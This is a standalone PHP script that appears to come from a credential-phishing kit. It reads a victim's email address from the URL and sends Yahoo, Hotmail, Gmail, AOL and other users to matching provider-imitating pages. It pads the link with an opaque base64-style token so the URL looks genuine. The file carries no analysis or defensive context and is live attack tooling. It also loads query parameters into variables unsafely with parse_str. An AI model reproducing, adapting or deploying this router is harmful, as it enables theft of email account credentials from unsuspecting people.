<?php 
	$path="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($path, PHP_URL_QUERY));

	$domain = explode('@', $username);
	
	$at_domain = '@'.strtolower($domain[1]);
	$param = "/index.php?src=ZWppZXdpb2U5NDluZHNmNDBlb2RzaTRpZWprMzBka2prZWtjamtkIGNuZmk0bmZpb25ja29uc2NrIGtjIGtqIHZqayBj&username=$username";
	
	if(stripos($at_domain, '@yahoo.') !== false || stripos($at_domain, '@rocketmail.') !== false || stripos($at_domain, '@ymail.') !== false){
		header('Location: ya'.$param);
	}
	elseif(stripos($at_domain, '@live.') !== false || stripos($at_domain, '@hotmail.') !== false || stripos($at_domain, '@msn.') !== false) {
		header('Location: ho'.$param);
	}
	elseif(stripos($at_domain, '@gmail.') !== false || stripos($at_domain, '@google.') !== false) {
		header('Location: gm'.$param);
	}
	elseif(stripos($at_domain, '@aol.') !== false || stripos($at_domain, '@aim.') !== false) {
		header('Location: aol'.$param);
	}
	else {
		header('Location: general'.$param);
	}
	exit;
		
?>